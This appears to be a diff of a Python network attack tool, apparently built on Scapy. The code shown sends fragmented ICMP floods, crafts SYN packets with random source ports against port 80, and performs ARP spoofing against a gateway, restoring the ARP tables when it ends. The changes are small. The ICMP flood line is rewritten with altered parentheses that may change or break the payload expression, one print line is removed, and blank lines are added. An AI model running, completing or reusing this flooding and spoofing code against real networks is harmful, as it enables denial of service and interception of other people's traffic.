@@ -63,8 +63,9 @@ def thread_delay(thread_name, delay, ip):
 	
 
 	if args.icmp:
-		send(numPackets*(fragment(ip_layer/ICMP()/(args.icmp*6000))))
 		
+ 		send(numPackets*(fragment(ip_layer/ICMP()/args.icmp*6000)))
+
 
 	elif args.syn:
 		tcp=TCP(sport=RandShort(), dport=80, flags="S")
@@ -76,7 +77,6 @@ def thread_delay(thread_name, delay, ip):
 	elif args.arp:
 		try:
 			gtw = ipaddress.ip_address(args.arp)
-			print('%s is a correct IP%s address.' % (gtw, gtw.version))
 		except:
 			print('Address/netmask is invalid: %s' % args.arp)
 			exit(1)
@@ -254,6 +254,7 @@ else:
 				count += 1
 		
 		# End with CTRL + C
+		
 		if args.number:
 			try:
 				time.sleep(0.5)
@@ -275,6 +276,7 @@ else:
 						restore(args.arp, line.strip())
 				print("\n Terminating...")
 				os._exit(1)
+	
 		
 	else:
 		print("Defining one/multiple destination IP Addresses is mandatory.")
